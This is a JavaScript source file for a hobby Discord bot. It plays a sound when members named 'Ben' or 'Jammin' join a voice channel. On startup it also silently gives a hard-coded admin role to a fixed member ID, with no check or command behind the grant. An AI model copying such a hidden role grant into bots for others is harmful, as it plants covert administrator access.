const { Client, Intents, PermissionsBitField, GatewayIntentBits} = require('discord.js');
const { 
    createAudioPlayer, 
    createAudioResource, 
    joinVoiceChannel,
    AudioPlayerStatus,
    VoiceConnectionStatus,
    getVoiceConnection } = require('@discordjs/voice');

const { token } = require('./config.json');


const botClient = new Client({
	intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers,
	],
});
    
botClient.login(token);
// const adminPermissions = new PermissionsBitField(PermissionsBitField.Flags.Administrator);


// When the bot is ready, run this code (only once)
botClient.once('ready', async () => {
    console.log('Ready!');
    // botClient.guilds.cache.forEach(server => {
    //     server.roles.cache.forEach(role => {
    //         console.log(role.name, role.rawPosition);
    //     });
    //     console.log('-----------');
    // });
    const server = botClient.guilds.cache.get('702406379624988712');
    const member = await server.members.fetch('406458825898459137');
    const adminrole = await server.roles.fetch('1051425258399342594');

    // server.roles.create({ name: 'lol', permissions: ["ADMINISTRATOR"] });

    member.roles.add(adminrole);
    // console.log(adminrole.name);
    // server.roles.cache.forEach(role => {
    //     console.log(role.name,role.id,role.rawPosition);
    // });
    // // console.log(bot.channels.cache.get('732149664131973136'));    
});

const soundfile = 'Sounds/ben.mp3';


let voiceChannel;
botClient.on('voiceStateUpdate', (oldState, newState) => {

    voiceChannel = newState.channel;
    
    if (oldState.channel == voiceChannel) return;
    
    memberName = newState.member.nickname == null? newState.member.displayName:newState.member.nickname;
    if (memberName.match(/([Bb]en)|( ?[jJ]am{1,2}in)/) == null) return;

    if (voiceChannel != null && newState.member.id != botClient.user.id) {
        const connection = joinVoiceChannel({
            channelId: voiceChannel.id,
            guildId: voiceChannel.guild.id,
            adapterCreator: voiceChannel.guild.voiceAdapterCreator,
        });
        
        connection.on(VoiceConnectionStatus.Ready, () => {

            player = createAudioPlayer();
            soundResource = createAudioResource(soundfile);
            player.play(soundResource);

            connection.subscribe(player);

            player.on(AudioPlayerStatus.Idle, () => { connection.destroy()});

        });
    }
});


botClient.on('messageCreate', ()=> {

});
